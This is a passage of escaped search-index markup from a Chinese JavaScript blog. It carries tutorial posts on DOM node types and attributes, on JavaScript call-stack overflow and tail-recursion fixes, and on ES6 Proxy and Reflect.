&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var div = document.getElementById(&amp;quot;myDiv&amp;quot;); 
alert(div.tagName); //&amp;quot;DIV&amp;quot; 
alert(div.tagName == div.nodeName); //true 


if (element.tagName == &amp;quot;div&amp;quot;){ //不能这样比较，很容易出错！
 //在此执行某些操作
} 

if (element.tagName.toLowerCase() == &amp;quot;div&amp;quot;){ //这样最好（适用于任何文档）
 //在此执行某些操作
}

&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;html元素&#34;&gt;HTML元素&lt;/h3&gt;
&lt;p&gt;这些属性分别对应于每个 HTML 元素中都存在的下列标准特性。、&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;id，元素在文档中的唯一标识符。&lt;/li&gt;
&lt;li&gt;title，有关元素的附加说明信息，一般通过工具提示条显示出来。&lt;/li&gt;
&lt;li&gt;lang，元素内容的语言代码，很少使用。&lt;/li&gt;
&lt;li&gt;dir，语言的方向，值为&amp;quot;ltr&amp;quot;（left-to-right，从左至右）或&amp;quot;rtl&amp;quot;（right-to-left，从右至左）， 也很少使用。&lt;/li&gt;
&lt;li&gt;className，与元素的class 特性对应，即为元素指定的CSS类。没有将这个属性命名为class， 是因为 class 是 ECMAScript 的保留字&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;myDiv&amp;quot; class=&amp;quot;bd&amp;quot; title=&amp;quot;Body text&amp;quot; lang=&amp;quot;en&amp;quot; dir=&amp;quot;ltr&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;获取上面元素的信息&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var div = document.getElementById(&amp;quot;myDiv&amp;quot;); 

//获取值
alert(div.id); //&amp;quot;myDiv&amp;quot;&amp;quot; 
alert(div.className); //&amp;quot;bd&amp;quot; 
alert(div.title); //&amp;quot;Body text&amp;quot; 
alert(div.lang); //&amp;quot;en&amp;quot; 
alert(div.dir); //&amp;quot;ltr&amp;quot; 

//设置值
div.id = &amp;quot;someOtherId&amp;quot;; 
div.className = &amp;quot;ft&amp;quot;; 
div.title = &amp;quot;Some other text&amp;quot;; 
div.lang = &amp;quot;fr&amp;quot;; 
div.dir =&amp;quot;rtl&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;获取特征&#34;&gt;获取特征&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;getAttribute()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因为 id 和 align 在 HTML 中是的公认特性&lt;/p&gt;
&lt;p&gt;自定义特性无法直接通过对象身上属性获取&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;myDiv&amp;quot; align=&amp;quot;left&amp;quot; my_special_attribute=&amp;quot;hello!&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;alert(div.id); //&amp;quot;myDiv&amp;quot; 
alert(div.my_special_attribute); //undefined
alert(div.align); //&amp;quot;left&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也不能这样为DOM元素添加一个自定义属性&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;div.mycolor = &amp;quot;red&amp;quot;; 
alert(div.getAttribute(&amp;quot;mycolor&amp;quot;)); //null
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var div = document.getElementById(&amp;quot;myDiv&amp;quot;); 

//getAttribute 
alert(div.getAttribute(&amp;quot;id&amp;quot;)); //&amp;quot;myDiv&amp;quot; 
alert(div.getAttribute(&amp;quot;class&amp;quot;)); //&amp;quot;bd&amp;quot;
alert(div.getAttribute(&amp;quot;my_special_attribute&amp;quot;)) //&amp;quot;hello
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;设置特性&#34;&gt;设置特性&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;setAttribute()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个方法接受两个参数：&lt;strong&gt;要设置的特性名&lt;/strong&gt;和 &lt;strong&gt;值&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果特性已经存在，setAttribute()会以指定的值替换现有的值&lt;/p&gt;
&lt;p&gt;如果特性不存在，setAttribute() 则创建该属性并设置相应的值&lt;/p&gt;
&lt;p&gt;通过这个方法设置的 特性名会被统一转换为小写形式&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;div.setAttribute(&amp;quot;id&amp;quot;, &amp;quot;someOtherId&amp;quot;); 
div.setAttribute(&amp;quot;class&amp;quot;, &amp;quot;ft&amp;quot;); 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;移除特性&#34;&gt;移除特性&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;removeAttribute()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个方法用于彻底删除元素的特性。调用这个方 法不仅会清除特性的值，而且也会&lt;strong&gt;从元素中完全删除特性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;div.removeAttribute(&amp;quot;class&amp;quot;)&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;attributes属性&#34;&gt;attributes属性&lt;/h3&gt;
&lt;p&gt;Element 类型是使用 attributes 属性的唯一一个 DOM 节点类型。&lt;/p&gt;
&lt;p&gt;元素的每一个特性都由一个 Attr 节 点表示，每个节点都保存在 NamedNodeMap 对象中。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;getNamedItem(name)：返回 nodeName 属性等于 name 的节点；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;removeNamedItem(name)：从列表中移除 nodeName 属性等于 name 的节点；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;setNamedItem(node)：向列表中添加节点，以节点的 nodeName 属性为索引；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;item(pos)：返回位于数字 pos 位置处的节点。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;创建元素&#34;&gt;创建元素&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;document.createElement()&lt;/code&gt;可以创建新元素&lt;/p&gt;
&lt;p&gt;这个方法只接受一个参数：&lt;strong&gt;这个方法只接受一个参数&lt;/strong&gt;，这个方法只接受一个参数&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;元素的子节点&#34;&gt;元素的子节点&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var ul = document.getElementById(&amp;quot;myList&amp;quot;); 
var items = ul.getElementsByTagName(&amp;quot;li&amp;quot;); 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里&lt;code&gt;&amp;lt;ul&amp;gt;&lt;/code&gt;的后代中只包含直接子元素。不过，&lt;strong&gt;如果它包含更多层次的后代元素，那 么各个层次中包含的&lt;code&gt;&amp;lt;li&amp;gt;&lt;/code&gt;元素也都会返回&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;text类型&#34;&gt;Text类型&lt;/h2&gt;
&lt;p&gt;可以通过 nodeValue 属性或 data 属性访问 Text 节点中包含的文本，这两个属性中包含的值相同。&lt;/p&gt;
&lt;h3 id=&#34;创建文本节点&#34;&gt;创建文本节点&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;document.createTextNode()&lt;/code&gt;创建新文本节点&lt;/p&gt;
&lt;p&gt;接受一个参数：&lt;strong&gt;要插入节点 中的文本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;document.createTextNode(&amp;quot;Hello world!&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;规范化文本节点&#34;&gt;规范化文本节点&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;normalize()&lt;/code&gt; 能够将相邻文本节点合并的方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var element = document.createElement(&amp;quot;div&amp;quot;); 

var textNode = document.createTextNode(&amp;quot;Hello world!&amp;quot;); 
element.appendChild(textNode); 

var anotherTextNode = document.createTextNode(&amp;quot;Yippee!&amp;quot;); 
element.appendChild(anotherTextNode); 

document.body.appendChild(element); 

//两个文本节点
alert(element.childNodes.length); //2 

element.normalize(); 

//合成为一个文本节点
alert(element.childNodes.length); //1 
alert(element.firstChild.nodeValue); // &amp;quot;Hello world!Yippee!&amp;quot; 

&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;分割文本节点&#34;&gt;分割文本节点&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;splitText()&lt;/code&gt;按照指定的位置分割 nodeValue 值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var element = document.createElement(&amp;quot;div&amp;quot;); 
element.className = &amp;quot;message&amp;quot;; 

var textNode = document.createTextNode(&amp;quot;Hello world!&amp;quot;); 
element.appendChild(textNode); 

document.body.appendChild(element); 

var newNode = element.firstChild.splitText(5); 

alert(element.firstChild.nodeValue); //&amp;quot;Hello&amp;quot; 
alert(newNode.nodeValue); //&amp;quot; world!&amp;quot; 
alert(element.childNodes.length); //2 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;comment类型&#34;&gt;Comment类型&lt;/h2&gt;
&lt;p&gt;用于代码块加注释&lt;/p&gt;
&lt;p&gt;Comment 类型与 Text 类型继承自相同的基类，因此它拥有除 splitText()之外的所有字符串操 作方法。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;document.createComment()&lt;/code&gt;为其传递注释文本也可以创建注释节点&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;attr类型&#34;&gt;Attr类型&lt;/h2&gt;
&lt;p&gt;最常使用的是 &lt;code&gt;getAttribute()&lt;/code&gt;、&lt;code&gt;setAttribute()&lt;/code&gt;、&lt;code&gt;remveAttribute()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Attr 对象有 3 个属性：name、value 和 specified&lt;/p&gt;
&lt;p&gt;name 是特性名称（与 nodeName 的 值相同），value 是特性的值（与 nodeValue 的值相同），而 specified 是一个布尔值，用以区别特 性是在代码中指定的，还是默认的。&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;document.createAttribute()&lt;/code&gt;并传入特性的名称可以创建新的特性节点&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var attr = document.createAttribute(&amp;quot;align&amp;quot;); 
attr.value = &amp;quot;left&amp;quot;; 

element.setAttributeNode(attr); 

alert(element.attributes[&amp;quot;align&amp;quot;].value); //&amp;quot;left&amp;quot; 
alert(element.getAttributeNode(&amp;quot;align&amp;quot;).value); //&amp;quot;left&amp;quot; 
alert(element.getAttribute(&amp;quot;align&amp;quot;)); //&amp;quot;left&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
">DOM 节点层次</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/wei-shi-me-javascript-dai-ma-hui-chu-xian-zhan-yi-chu/"" data-c="
          &lt;p&gt;哪些情况下代码才算是“⼀段”代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 当JavaScript执⾏全局代码的时候，会编译全局代码并创建全局执⾏上下⽂，⽽且在整个⻚⾯的⽣存周期 内，全局执⾏上下⽂只有⼀份。
2. 当调⽤⼀个函数的时候，函数体内的代码会被编译，并创建函数执⾏上下⽂，⼀般情况下，函数执⾏结 束之后，创建的函数执⾏上下⽂会被销毁。
3.  当使⽤eval函数的时候，eval的代码也会被编译，并创建执⾏上下⽂。
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628256874452.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;那为什么会出现这种错误呢？这就涉及到了&lt;strong&gt;调⽤栈&lt;/strong&gt;的内容&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;调⽤栈就是⽤来管理函数调⽤关系的⼀种数据结构&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;什么是函数调用&#34;&gt;什么是函数调⽤&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var a = 2
function add(){
var b = 10
return a+b
}
add()
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;⾸先，从全局执⾏上下⽂中，取出add函数代码。&lt;/li&gt;
&lt;li&gt;其次，对add函数的这段代码进⾏编译，并创建该函数的执⾏上下⽂和可执⾏代码。&lt;/li&gt;
&lt;li&gt;最后，执⾏代码，输出结果&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当执⾏到add函数的时候，我们就有了两个执⾏上下⽂了⸺全局执⾏上下⽂和add函数的执⾏上 下⽂。&lt;/p&gt;
&lt;p&gt;也就是说在执⾏JavaScript时，可能会存在多个执⾏上下⽂，那么JavaScript引擎是如何管理这些执⾏上下 ⽂的呢？&lt;/p&gt;
&lt;p&gt;答案是通过⼀种叫&lt;strong&gt;栈的数据结构来管理的&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;什么是栈&#34;&gt;什么是栈&lt;/h2&gt;
&lt;p&gt;栈中的元素满⾜&lt;strong&gt;后进先出&lt;/strong&gt;的特点&lt;/p&gt;
&lt;p&gt;JavaScript引擎正是利⽤栈的这种结构来管理执⾏上下⽂的。&lt;/p&gt;
&lt;p&gt;通常把这种⽤来管理执⾏上下⽂的栈称为执⾏上下⽂栈，⼜称&lt;strong&gt;调⽤栈&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;调⽤栈是JavaScript引擎追踪函数执⾏的⼀个机制&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;栈溢出stack-overflow&#34;&gt;栈溢出（Stack Overflow）&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;调⽤栈&lt;/strong&gt;是有⼤⼩的，当⼊栈的执⾏上下⽂超过⼀定数⽬，JavaScript引擎就会报错，我们把这种错误叫做&lt;strong&gt;栈溢出&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;特别是在你写递归代码的时候，就很容易出现栈溢出的情况。&lt;/p&gt;
&lt;p&gt;修改以下代码使其不会栈溢出&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function runStack (n) {
if (n === 0) return 100;
return runStack( n- 2);
}
runStack(50000)
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;尾递归解决&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function runStack (n, result=100) {
if (n === 0) return result;
return runStack( n- 2, result);
}
runStack(50000, 100)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者循环解决&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function runStack (n) {
    while(true)
        {
            if (n === 0) return 100;
            else if (n==1) return 100;
            else {
                n=n-2
            }
        } 


}

&lt;/code&gt;&lt;/pre&gt;
">为什么JavaScript代码会出现栈溢出？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/proxy/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;Proxy 用于修改某些操作的默认行为，等同于在语言层面做出修改，所以属于一种“元编程”（meta programming），即对编程语言进行编程&lt;/p&gt;
&lt;p&gt;Proxy 可以理解成，在目标对象之前架设一层“拦截”，外界对该对象的访问，都必须先通过这层拦截&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var obj = new Proxy({}, {
  get: function (target, propKey, receiver) {
    console.log(`getting ${propKey}!`);
    return Reflect.get(target, propKey, receiver);
  },
  set: function (target, propKey, value, receiver) {
    console.log(`setting ${propKey}!`);
    return Reflect.set(target, propKey, value, receiver);
  }
});


obj.count = 1
//  setting count!
++obj.count
//  getting count!
//  setting count!
//  2
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;ES6 原生提供 Proxy 构造函数，用来生成 Proxy 实例。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;var proxy = new Proxy(target, handler);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Proxy 对象的所有用法，都是上面这种形式，不同的只是&lt;code&gt;handler&lt;/code&gt;参数的写法&lt;/p&gt;
&lt;p&gt;&lt;code&gt;target&lt;/code&gt;参数表示所要拦截的目标对象，&lt;code&gt;handler&lt;/code&gt;参数也是一个对象，用来定制拦截行为&lt;/p&gt;
&lt;p&gt;Proxy 实例也可以作为其他对象的原型对象&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var proxy = new Proxy({}, {
  get: function(target, propKey) {
    return 35;
  }
});

let obj = Object.create(proxy);
obj.time // 35
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码中，&lt;code&gt;proxy&lt;/code&gt;对象是&lt;code&gt;obj&lt;/code&gt;对象的原型，&lt;code&gt;obj&lt;/code&gt;对象本身并没有&lt;code&gt;time&lt;/code&gt;属性，所以根据原型链，会在&lt;code&gt;proxy&lt;/code&gt;对象上读取该属性，导致被拦截。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;下面是 Proxy 支持的拦截操作一览，一共 13 种。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;get(target, propKey, receiver)&lt;/strong&gt;：拦截对象属性的读取，比如&lt;code&gt;proxy.foo&lt;/code&gt;和&lt;code&gt;proxy[&#39;foo&#39;]&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;set(target, propKey, value, receiver)&lt;/strong&gt;：拦截对象属性的设置，比如&lt;code&gt;proxy.foo = v&lt;/code&gt;或&lt;code&gt;proxy[&#39;foo&#39;] = v&lt;/code&gt;，返回一个布尔值。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;has(target, propKey)&lt;/strong&gt;：拦截&lt;code&gt;propKey in proxy&lt;/code&gt;的操作，返回一个布尔值。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;deleteProperty(target, propKey)&lt;/strong&gt;：拦截&lt;code&gt;delete proxy[propKey]&lt;/code&gt;的操作，返回一个布尔值。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ownKeys(target)&lt;/strong&gt;：拦截&lt;code&gt;Object.getOwnPropertyNames(proxy)&lt;/code&gt;、&lt;code&gt;Object.getOwnPropertySymbols(proxy)&lt;/code&gt;、&lt;code&gt;Object.keys(proxy)&lt;/code&gt;、&lt;code&gt;for...in&lt;/code&gt;循环，返回一个数组。该方法返回目标对象所有自身的属性的属性名，而&lt;code&gt;Object.keys()&lt;/code&gt;的返回结果仅包括目标对象自身的可遍历属性。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;getOwnPropertyDescriptor(target, propKey)&lt;/strong&gt;：拦截&lt;code&gt;Object.getOwnPropertyDescriptor(proxy, propKey)&lt;/code&gt;，返回属性的描述对象。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;defineProperty(target, propKey, propDesc)&lt;/strong&gt;：拦截&lt;code&gt;Object.defineProperty(proxy, propKey, propDesc）&lt;/code&gt;、&lt;code&gt;Object.defineProperties(proxy, propDescs)&lt;/code&gt;，返回一个布尔值。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;preventExtensions(target)&lt;/strong&gt;：拦截&lt;code&gt;Object.preventExtensions(proxy)&lt;/code&gt;，返回一个布尔值。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;getPrototypeOf(target)&lt;/strong&gt;：拦截&lt;code&gt;Object.getPrototypeOf(proxy)&lt;/code&gt;，返回一个对象。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;isExtensible(target)&lt;/strong&gt;：拦截&lt;code&gt;Object.isExtensible(proxy)&lt;/code&gt;，返回一个布尔值。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;setPrototypeOf(target, proto)&lt;/strong&gt;：拦截&lt;code&gt;Object.setPrototypeOf(proxy, proto)&lt;/code&gt;，返回一个布尔值。如果目标对象是函数，那么还有两种额外操作可以拦截。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;apply(target, object, args)&lt;/strong&gt;：拦截 Proxy 实例作为函数调用的操作，比如&lt;code&gt;proxy(...args)&lt;/code&gt;、&lt;code&gt;proxy.call(object, ...args)&lt;/code&gt;、&lt;code&gt;proxy.apply(...)&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;construct(target, args)&lt;/strong&gt;：拦截 Proxy 实例作为构造函数调用的操作，比如&lt;code&gt;new proxy(...args)&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var handler = {
  get: function(target, name) {
    if (name === &#39;prototype&#39;) {
      return Object.prototype;
    }
    return &#39;Hello, &#39; + name;
  },

  apply: function(target, thisBinding, args) {
    return args[0];
  },

  construct: function(target, args) {
    return {value: args[1]};
  }
};

var fproxy = new Proxy(function(x, y) {
  return x + y;
}, handler);

fproxy(1, 2) // 1     实例函数 拦截apply
new fproxy(1, 2) // {value: 2}  构造函数constructor
fproxy.prototype === Object.prototype // true
fproxy.foo === &amp;quot;Hello, foo&amp;quot; // true
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;proxy实例的方法&#34;&gt;Proxy实例的方法&lt;/h2&gt;
&lt;h3 id=&#34;get&#34;&gt;get()&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;et&lt;/code&gt;方法用于拦截某个属性的读取操作，可以接受三个参数：&lt;strong&gt;目标对象&lt;/strong&gt;、&lt;strong&gt;属性名&lt;/strong&gt;和 &lt;strong&gt;proxy 实例本身&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var person = {
  name: &amp;quot;张三&amp;quot;
};

var proxy = new Proxy(person, {
  get: function(target, propKey) {
    if (propKey in target) {
      return target[propKey];
    } else {
      throw new ReferenceError(&amp;quot;Prop name \&amp;quot;&amp;quot; + propKey + &amp;quot;\&amp;quot; does not exist.&amp;quot;);
    }
  }
});

proxy.name // &amp;quot;张三&amp;quot;
proxy.age // 抛出一个错误
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;get&lt;/code&gt;方法可以继承。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let proto = new Proxy({}, {
  get(target, propertyKey, receiver) {
    console.log(&#39;GET &#39; + propertyKey);
    return target[propertyKey];
  }
});

let obj = Object.create(proto);
obj.foo // &amp;quot;GET foo&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;拦截操作定义在&lt;code&gt;Prototype&lt;/code&gt;对象上面，所以如果读取&lt;code&gt;obj&lt;/code&gt;对象继承的属性时，拦截会生效。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;利用&lt;code&gt;get&lt;/code&gt;拦截，实现一个生成各种 DOM 节点的通用函数&lt;code&gt;dom&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const dom = new Proxy({}, {
  get(target, property) {
    return function(attrs = {}, ...children) {
      const el = document.createElement(property);
        //添加属性
      for (let prop of Object.keys(attrs)) {
        el.setAttribute(prop, attrs[prop]);
      }
      for (let child of children) {
        if (typeof child === &#39;string&#39;) {
          child = document.createTextNode(child);
        }
        el.appendChild(child);
      }
      return el;
    }
  }
});

const el = dom.div({},
  &#39;Hello, my name is &#39;,
  dom.a({href: &#39;//example.com&#39;}, &#39;Mark&#39;),
  &#39;. I like:&#39;,
  dom.ul({},
    dom.li({}, &#39;The web&#39;),
    dom.li({}, &#39;Food&#39;),
    dom.li({}, &#39;…actually that\&#39;s it&#39;)
  )
);

document.body.appendChild(el);
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628237451351.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;set&#34;&gt;set()&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;set&lt;/code&gt;方法用来拦截某个属性的赋值操作，可以接受四个参数：&lt;strong&gt;目标对象&lt;/strong&gt;、&lt;strong&gt;属性名&lt;/strong&gt;、&lt;strong&gt;属性值&lt;/strong&gt;和 &lt;strong&gt;Proxy 实例本身&lt;/strong&gt;，其中最后一个参数可选&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let validator = {
  set: function(obj, prop, value) {
    if (prop === &#39;age&#39;) {
      if (!Number.isInteger(value)) {
        throw new TypeError(&#39;The age is not an integer&#39;);
      }
      if (value &amp;gt; 200) {
        throw new RangeError(&#39;The age seems invalid&#39;);
      }
    }

    // 对于满足条件的 age 属性以及其他属性，直接保存
    obj[prop] = value;
    return true;
  }
};

let person = new Proxy({}, validator);

person.age = 100;

person.age // 100
person.age = &#39;young&#39; // 报错
person.age = 300 // 报错
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;如果目标对象自身的某个属性不可写，那么&lt;code&gt;set&lt;/code&gt;方法将不起作用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const obj = {};
Object.defineProperty(obj, &#39;foo&#39;, {
  value: &#39;bar&#39;,
  writable: false
});

const handler = {
  set: function(obj, prop, value, receiver) {
    obj[prop] = &#39;baz&#39;;
    return true;
  }
};

const proxy = new Proxy(obj, handler);
proxy.foo = &#39;baz&#39;;
proxy.foo // &amp;quot;bar&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;注意，&lt;code&gt;set&lt;/code&gt;代理应当返回一个布尔值。严格模式下，&lt;code&gt;set&lt;/code&gt;代理如果没有返回&lt;code&gt;true&lt;/code&gt;，就会报错。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&#39;use strict&#39;;
const handler = {
  set: function(obj, prop, value, receiver) {
    obj[prop] = receiver;
    // 无论有没有下面这一行，都会报错
    return false;
  }
};
const proxy = new Proxy({}, handler);
proxy.foo = &#39;bar&#39;;
// TypeError: &#39;set&#39; on proxy: trap returned falsish for property &#39;foo&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;apply&#34;&gt;apply()&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;apply&lt;/code&gt;方法拦截函数的调用、&lt;code&gt;call&lt;/code&gt;和&lt;code&gt;apply&lt;/code&gt;操作&lt;/p&gt;
&lt;p&gt;&lt;code&gt;apply&lt;/code&gt;方法可以接受三个参数：分别是目标对象、目标对象的上下文对象（&lt;code&gt;this&lt;/code&gt;）和目标对象的参数数组&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var target = function () { return &#39;I am the target&#39;; };
var handler = {
  apply: function () {
    return &#39;I am the proxy&#39;;
  }
};

var p = new Proxy(target, handler);

p()
// &amp;quot;I am the proxy&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var twice = {
  apply (target, ctx, args) {
    return Reflect.apply(...arguments) * 2;
  }
};
function sum (left, right) {
  return left + right;
};
var proxy = new Proxy(sum, twice);
proxy(1, 2) // 6
proxy.call(null, 5, 6) // 22
proxy.apply(null, [7, 8]) // 30
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;reflect&#34;&gt;Reflect&lt;/h2&gt;
&lt;h3 id=&#34;概述-2&#34;&gt;概述&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Reflect&lt;/code&gt;对象与&lt;code&gt;Proxy&lt;/code&gt;对象一样，也是 ES6 为了操作对象而提供的新 API。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;静态方法&#34;&gt;静态方法&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Reflect&lt;/code&gt;对象一共有 13 个静态方法。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Reflect.apply(target, thisArg, args)&lt;/li&gt;
&lt;li&gt;Reflect.construct(target, args)&lt;/li&gt;
&lt;li&gt;Reflect.get(target, name, receiver)&lt;/li&gt;
&lt;li&gt;Reflect.set(target, name, value, receiver)&lt;/li&gt;
&lt;li&gt;Reflect.defineProperty(target, name, desc)&lt;/li&gt;
&lt;li&gt;Reflect.deleteProperty(target, name)&lt;/li&gt;
&lt;li&gt;Reflect.has(target, name)&lt;/li&gt;
&lt;li&gt;Reflect.ownKeys(target)&lt;/li&gt;
&lt;li&gt;Reflect.isExtensible(target)&lt;/li&gt;
&lt;li&gt;Reflect.preventExtensions(target)&lt;/li&gt;
&lt;li&gt;Reflect.getOwnPropertyDescriptor(target, name)&lt;/li&gt;
